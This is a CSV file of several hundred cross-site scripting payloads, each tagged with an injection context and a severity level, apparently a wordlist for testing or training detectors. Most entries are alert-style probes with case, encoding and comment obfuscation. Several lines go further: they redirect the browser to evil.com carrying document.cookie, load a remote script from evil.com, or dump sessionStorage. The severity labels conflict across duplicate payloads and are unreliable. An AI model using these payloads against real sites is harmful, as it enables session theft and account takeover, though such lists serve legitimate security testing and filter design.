payload,context,severity
onload=”alert(‘AnonKryptiQuz’),html_body,medium
</tag><svg onload=alert(1)>,html_body,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
<script>alert(1)</script>,js_uri,high
"location=""javascript:confirm(1)""",dom_sink,high
"<object data=""javascript:alert(1)"">",js_uri,medium
%3cimg onerror=alert(1) src=a%3e,html_body,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,high
prompt(9),html_body,medium
' onerror=alert(1) x=',tag_injection,high
<script>alert(document.domain)</script>,script_injection,low
<svg/onload=confirm(1)>,js_uri,high
""" onerror=alert(1) x=""",attribute,high
onload=”alert(‘AnonKryptiQuz’),attribute,medium
<svg/onload=alert(1)>,tag_injection,high
"<embed src=""javascript:alert(1)"">",tag_injection,high
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
"document.write(""%3Cimg src=x onerror=alert(1)%3E"")",attribute_escape,medium
alert(2),html_body,medium
onload='alert(1)',html_body,medium
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"sEtTiMeOuT(""aLeRt(1)"",0)",event_handler,medium
alert(1),html_body,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
"\""><img src=x onerror=alert(1)>",js_uri,low
${alert(1)},template_injection,low
"javascript:void(document.location=""http://evil.com"")",js_uri,high
<sVG onload=AlerT()>,html_body,medium
"alert(1))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
"javascript:void(document.location=""http://evil.com"")",js_uri,low
alert(2),html_body,medium
"<embed>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
"""><ScRIPT ALeRt(STrInG.fROMCHARCODE(88,83,83))</sCrIpt>",html_body,high
onerror='alert(1)',html_body,medium
#{confirm(1)},template_injection,low
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"\""%3E%3Cimg src=x onerror=alert(1)%3E",attribute_escape,medium
"location=""javascr/**/ipt:alert(1)""",dom_sink,low
alert`1`,attribute,medium
"{{constructor.constructor(""alert(1)"")()}}",attribute_escape,high
"<img src
=x onerror
=alert(	1)>",event_handler,low
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
<math onload=alert()>,html_body,medium
<svg/onload=alert(1)>,tag_injection,low
<script>confirm(1)</script>,script_injection,medium
\u003cimg src onchange=alert(1)\u003e,attribute,medium
<svgonload=alert(1)>,html_body,medium
"\"" OnErRoR=AlErT(1)//",attribute_escape,high
' onmouseover=alert(1) ',attribute,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
alert(document.domain);,html_body,medium
' onload=alert(1) x=',attribute,medium
<body onload=alert(1)>,event_handler,medium
"javascript:void(document.location=""http://evil.com"")",event_handler,low
' onerror=\u0061\u006cert(1) x=',attribute,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
OnloAD=”ALErT(‘ANOnkrYPtIqUz’),attribute,medium
""" onload=confirm(1) x=""",attribute,low
<input onfocus=alert(1) autofocus>,attribute_escape,high
<BODY ONLOAD=alert(8839)>,html_body,medium
<video src=x onload=alert(1)>,event_handler,low
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
<svg onload=alert()>,html_body,medium
onErRor=aleRt(0);>,html_body,medium
onerror='alert(1)',html_body,medium
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
"?alert(1)"",",html_body,medium
onload=”alert(‘AnonKryptiQuz’),html_body,medium
"<svg onload=""confirm(7)"">",html_body,medium
<body onload=alert(1)>,event_handler,medium
<img src=x onerror=alert(1)>,attribute_escape,medium
"{{constructor.constructor(""alert(1)"")()}}",dom_sink,low
<img/src=x onerror=alert(1)//>,js_uri,medium
<svg/onload=alert(1)>,tag_injection,high
#{alert(1)},template_injection,high
<svg/onload=alert(1)>,dom_sink,high
j\u0061v\u0061script:confirm(1),js_uri,high
<script>alert(1)</script>,generic,medium
<svg/onload=alert(1)>,tag_injection,low
"<svg onload=""confirm(7)"">",html_body,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,low
<body onload=alert(1)>,event_handler,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
<SCRIPT>alert(1)</SCRIPT>,tag_injection,medium
<marquee>d.innerHTML+='';</script>,html_body,high
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
""" onerror=alert(1) x=""",attribute,high
%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E,script_injection,high
%3Cimg/src=%3Dx+onload=alert(2)%3D,html_body,medium
<svg onload=alert(1)>,event_handler,low
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
onload='alert(1)',html_body,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
%3Cscript%3Ealert(document.domain)%3C/script%3E,attribute,high
"eval(""alert(1)"")",dom_sink,high
"prompt`1`)//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
<img/src/onerror=alert(1),html_body,medium
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
"oncontextmenu=""alert(1)""",html_body,medium
ONLOad='ALeRt(1)',html_body,medium
javascript:alert(1),script_injection,high
"<iframe src=""javascript:alert(1)"">",tag_injection,medium
"<ScrIpt>alErt(strINg.fROMChARCODE(88,83,83))</sCRIPT>",html_body,high
${alert(	1)},template_injection,high
\' onerror=alert(1)//,attribute_escape,low
' onmouseover=alert(1) ',attribute,low
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
javascript:alert(document.domain),js_uri,low
;alert(1);,html_body,medium
' onerror=confirm(1) x=',attribute,medium
"setTimeout(""alert(1)"",0)",dom_sink,high
onerror=alert(0);>,html_body,medium
"\"" onerror=alert(1)//",attribute_escape,high
"""><svg onload=alert()>",html_body,medium
' onerror=alert(1) x=',attribute,low
""" onclick=alert()1 a=""",attribute,medium
"<ScRIpT>D.iNNErhTML+='';</sCrIpT>//[""'`-->]]>]</div>",html_body,high
<SCRIPT src=//evil.com/xss.js></SCRIPT>,dom_sink,low
"onload=""prompt`1`""",html_body,medium
<marquee onstart=alert(1)>,script_injection,high
"javascript:void(document.location=""http://evil.com"")",js_uri,high
"""><details>alert(String.fromCharCode(88,83,83))</script>",attribute,high
javascript:confirm(0);,url,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",event_handler,medium
<%= alert(1) %>,template_injection,medium
"setTimeout(""al'+'ert(1)"",0)",tag_injection,medium
\' onload=alert(1)//,event_handler,low
${alert(1)},template_injection,low
"""><svg onload=alert()>",html_body,medium
<svg src=x onerror=alert(1)>,dom_sink,high
"<script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
setInterval('ale'+'rt(10)');,html_body,high
"<object data
=""javascript:alert(	1)"">",tag_injection,high
alert(1),html_body,medium
"<embed src=""javascript:alert(1)"">",tag_injection,medium
</tag><svg onload=alert(1)>,html_body,medium
alert(2),html_body,medium
\' onerror=alert(1)//,event_handler,low
#{alert(1)},js_uri,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
javascript:confirm(1),js_uri,medium
-alert(1)-',html_body,medium
confirm(),html_body,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
"onblur=""alert(1)""",html_body,medium
"mrco24""type=image src onerror=""alert(1)""",html_body,medium
<video src=x onerror=alert(1)>,event_handler,medium
javascript:alert(document.domain),js_uri,medium
<script>alert(document.domain)</script>,script_injection,low
<scr/**/ipt>prompt(1)</scr/**/ipt>,script_injection,low
confirm(),html_body,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
javascript:alert(document.domain),script_injection,high
' onmouseover=alert(1) ',attribute,low
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<image src/onerror=alert(1)>,html_body,medium
onload='alert(1)',html_body,medium
onerror=alert;throw 23;,html_body,low
"//"";alERt(STRiNG.fROmcHArcodE(88,83,83))",html_body,high
""" onfocus=alert(1) autofocus=""",attribute,low
<body onload=alert(1)>,event_handler,medium
\x3cbody onload=alert(1)\x3e,attribute_escape,low
"document.body.innerHTML=""<svg src=x onerror=alert(1)>""",dom_sink,medium
<image src/onerror=alert(1)>,html_body,medium
#jAVAScRIPT:ALERT(2);,url,medium
<video src=x onerror=confirm(1)>,event_handler,low
"setTimeout(""alert(1)"",0)",attribute,high
alert(1);,html_body,medium
<img src/onerror=prompt(8)>,html_body,medium
#{confirm(1)},template_injection,high
"location=""javascript:alert(1)""",dom_sink,medium
"document.write(""<img src=x onload=alert(1)>"")",event_handler,high
<svgonload=alert(1)>,html_body,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
""">< script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"""><svg onload=alert()>",html_body,medium
alert(1);,html_body,medium
"javascript:void(document.location=""http://evil.com"")",template_injection,low
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
<BoDy oNlOaD=AlErT(1)>,event_handler,high
\' onerror=alert(1)//,attribute_escape,high
<input onfocus=alert(1) autofocus>,js_uri,low
javascript:confirm(1),js_uri,low
""" onerror=alert(1) x=""",attribute,low
\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,high
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
"eval(""alert(1)"")",js_uri,low
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,html_body,high
<script>alert(1)</script>,script_injection,medium
<audio src/onerror=alert(1)>,html_body,medium
""" onerror=confirm(1) x=""",script_injection,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
\' onerror=al'+'ert(1)//,attribute_escape,high
<img src/onerror=prompt(8)>,html_body,medium
#{confirm(1)},js_uri,high
<input onfocus=al'+'ert(1) autofocus>,event_handler,medium
_0x68087f:alert(0x1);,html_body,medium
' onerror=alert(1) x=',attribute,medium
"<iframe src
=""javascript:alert(	1)"">",tag_injection,medium
{{7*7}},template_injection,high
"&quot; onerror
=alert(	1) x
=&quot;",event_handler,high
<body onload=alert(1)>,event_handler,medium
"<embed src=""javascript:alert(1)"">",tag_injection,low
"\""\x3e\x3cimg src=x onerror=alert(1)\x3e",attribute_escape,low
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
\x3cscript\x3econfirm(1)\x3c/script\x3e,script_injection,high
<input onfocus=\u0061\u006cert(1) \u0061utofocus>,event_handler,medium
{{7*7}},template_injection,high
"\""><img src=x onerror=alert(1)>",attribute_escape,medium
<img src=x onerror=alert(1)>,tag_injection,medium
<img src=x onerror=alert(1)>,js_uri,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
<script>confirm(1)</script>,script_injection,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
"""><svg onload=alert(1)>",attribute,medium
onload=”alert(‘AnonKryptiQuz’),attribute,medium
<video src=x onerror=alert(1)>,js_uri,medium
"<svg onload=""confirm(7)"">",html_body,medium
/?xss=500); alert(document.cookie);//,js_block,high
嘼img src=1 onerror=alert(1)嘾,html_body,medium
<img src/onerror=alert(1)>,html_body,medium
<img src/onerror=prompt(8)>,html_body,medium
"eval(""alert(1)"")",dom_sink,high
jAvAsCrIpT:CoNfIrM(1),dom_sink,low
"""><img src=x onerror=alert(1)>",attribute,medium
"""><button onload=alert()>",html_body,medium
"{{([].toString()).constructor.prototype.charAt=[].join;$eval(([].toString()).constructor.fromCodePoint([120],[61],[49],[125],[125],[125],[59],[97],[108],[101],[114],[116],[40],[49],[41],[47],[47]));}}",js_string,low
"\""<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss",attribute,high
"""><svg onload=alert()>",html_body,medium
"{{constructor.constructor(""\u0061\u006cert(1)"")()}}",template_injection,medium
<svg id=1 onload=confirm(1)>,html_body,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
' onmouseover=alert(1) ',attribute,medium
<script>prompt(1)</script>,attribute_escape,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
<BODY ONLOAD=alert(8839)>,html_body,medium
"#""><svg onload=alert(1)>",attribute,medium
\u003e\u003cimg src=1 onerror=alert(0)\u003e,attribute,medium
-alert(23)/,html_body,medium
"%20""><svg onload=alert(1)>",html_body,medium
""" onload=alert(1) x=""",attribute,high
<img src=x onerror=alert(1)>,dom_sink,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
alert(2),html_body,medium
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
<video src=x onerror=alert(1)>,event_handler,medium
""" onload=alert(1) x=""",dom_sink,medium
"\"" onerror=alert(1)//",attribute_escape,high
</script><svg onload=alert(1)>,html_body,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
"onerror=""alert(document.cookie)""",html_body,medium
onerror=alert(0);>,html_body,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
<img src/onerror=alert(1)>,html_body,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
<marquee onstart=alert(1)>,event_handler,medium
oNlOaD='ALERt(1)',html_body,medium
<input onfocus=alert(1) autofocus>,event_handler,high
j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in),js_uri,high
"<embed src
=""javascript:alert(	1)"">",tag_injection,low
<details open ontoggle=alert(1)>,event_handler,low
%3Cimg/src=%3Dx+onload=alert(2)%3D,html_body,medium
"{{constructor.constructor(""confirm(1)"")()}}",attribute_escape,low
onerror='alert(1)',html_body,medium
${alert(1)},attribute_escape,low
"""><img src
=x onerror
=alert(	1)>",attribute,low
""" onerror=alert()1 a=""",attribute,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
"%20""><svg onload=alert(1)>",html_body,medium
""">< svg onload=alert(1)>",attribute,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
< svg onload=alert()>,html_body,medium
<script>prompt(1)</script>,tag_injection,medium
"""><svg onload=prompt`1`>",html_body,medium
"\"" onerror=alert(1)//",attribute_escape,medium
"""\x3e\x3cimg src=x onerror=alert(1)\x3e",attribute,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
confirm(),html_body,medium
‘ onmouseover=’alert(1)’,html_body,medium
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,tag_injection,high
""" onerror=alert(1) x=""",attribute,high
<details open ontoggle=alert(1)>,event_handler,high
{{7*7}},template_injection,medium
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
"//"";alert(String.fromCharCode(88,83,83))",attribute,high
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
"<object data=""javascript:alert(1)"">",tag_injection,medium
onerror=alert(0);>,html_body,medium
"<object data=""javascript:alert(1)"">",tag_injection,low
嘼img src=1 onerror=self.alert(1)嘾,attribute,medium
"onsearch=""alert(1)""",html_body,medium
onload='alert(1)',html_body,medium
{{7*7}},js_uri,high
;alert(1);,html_body,medium
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
"{{constructor.constructor(""confirm(1)"")()}}",script_injection,medium
"vbscript:prompt(1)#{""action"":1}",js_block,medium
""" onerror=confirm(1) x=""",attribute,low
""" onload=alert(1) x=""",attribute,low
<svgonload=alert(1)>,attribute,medium
<svg onload=alert()>,html_body,medium
"\x3cembed src=""javascript:alert(1)""\x3e",tag_injection,medium
"document.write(""&lt;img src=x onerror=alert(1)&gt;"")",attribute_escape,low
<BODY ONLOAD=alert(8839)>,html_body,medium
javascript:alert(document.domain),attribute,high
javascript:confirm(1)//,url,medium
<body onload=alert(1)>,event_handler,low
JavaSCript:alert(123),url,medium
